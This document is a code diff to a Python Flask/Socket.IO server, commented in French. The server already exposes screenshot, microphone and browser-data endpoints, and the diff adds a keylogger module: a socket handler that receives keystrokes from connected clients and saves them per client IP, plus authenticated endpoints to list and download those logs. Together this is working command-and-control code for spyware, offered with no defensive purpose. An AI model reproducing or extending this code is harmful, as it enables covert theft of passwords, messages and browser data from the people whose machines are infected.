@@ -43,6 +43,7 @@ clients_ns = api.namespace('api/v1/clients', description='Client operations')
 screenshot_ns = api.namespace('api/v1/screenshot', description='Screenshot operations')
 microphone_ns = api.namespace('api/v1/microphone', description='Microphone operations')
 browser_ns = api.namespace('api/v1/browser', description='Browser data operations')
+keylogger_ns = api.namespace('api/v1/keylogger', description='Keylogger operations')
 
 auth_model = api.model('Auth', {'secret_key': fields.String(required=True, description='Clé secrète')})
 command_model = api.model('Command', {
@@ -74,6 +75,11 @@ browser_model = api.model('Browser', {
     'browser_name': fields.String(required=True, description='Nom du navigateur'),
     'file_path': fields.String(required=True, description='Chemin du fichier des données du navigateur'),
     'date_created': fields.String(required=True, description='Date de création des données du navigateur')
+})
+keylogger_model = api.model('Keylogger', {
+    'id': fields.Integer(required=True, description='ID du keylogger'),
+    'file_path': fields.String(required=True, description='Chemin du fichier du keylogger'),
+    'date_created': fields.String(required=True, description='Date de création du keylogger')
 })
 
 client_params = api.parser()
@@ -275,6 +281,30 @@ class GetBrowserDataFile(Resource):
             return {'status': 'error', 'message': 'Fichier de données du navigateur non trouvé.'}, 404
 
 
+@keylogger_ns.route('/client/<int:client_id>')
+class GetKeyloggersByClientId(Resource):
+    @jwt_required()
+    @api.doc(security='bearer_auth')
+    @keylogger_ns.marshal_with(keylogger_model, as_list=True)
+    def get(self, client_id):
+        keyloggers = Command.query.filter_by(client_id=client_id, type=CommandType.KEYLOGGER).all()
+        for keylogger in keyloggers:
+            keylogger.date_created = keylogger.date_created.strftime('%d/%m/%Y à %H:%M:%S')
+        return keyloggers, 200
+
+
+@keylogger_ns.route('/log/<int:keylogger_id>')
+class GetKeyloggerLog(Resource):
+    @jwt_required()
+    @api.doc(security='bearer_auth')
+    def get(self, keylogger_id):
+        keylogger = Command.query.get(keylogger_id)
+        if keylogger and os.path.exists(keylogger.file_path):
+            return send_file(keylogger.file_path, mimetype='text/plain')
+        else:
+            return {'status': 'error', 'message': 'Fichier du keylogger non trouvé.'}, 404
+
+
 @socketio.on('connect')
 def handle_connect():
     client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
@@ -362,6 +392,28 @@ def handle_browser_data(data):
         db.session.add(new_command)
         db.session.commit()
         app.logger.info(f"Données du navigateur reçues de {client.ip} et enregistrées sous {file_path}")
+
+
+@socketio.on('keyboard_response')
+def handle_keyboard(data):
+    sid = request.sid
+    client = Client.query.filter_by(sid=sid).first()
+    if client:
+        keylogger_dir = f"keyloggers/{client.ip}"
+        os.makedirs(keylogger_dir, exist_ok=True)
+        file_name = f"{datetime.now().strftime('%Y-%m-%d_%H')}.txt"
+        keylogger_path = f"{keylogger_dir}/{file_name}"
+        with open(keylogger_path, 'w', encoding='utf-8') as f:
+            for key in data.get('keyboard_log', []):
+                f.write(f"{key[0]} - {key[1]}\n")
+        new_command = Command(type=CommandType.KEYLOGGER, client_id=client.id, file_path=keylogger_path)
+        if db.session.query(Command).filter_by(file_path=keylogger_path).count() > 0:
+            update_command = Command.query.filter_by(file_path=keylogger_path).first()
+            update_command.date_created = datetime.now()
+            db.session.commit()
+        else:
+            db.session.add(new_command)
+            db.session.commit()
 
 
 @socketio.on('disconnect')
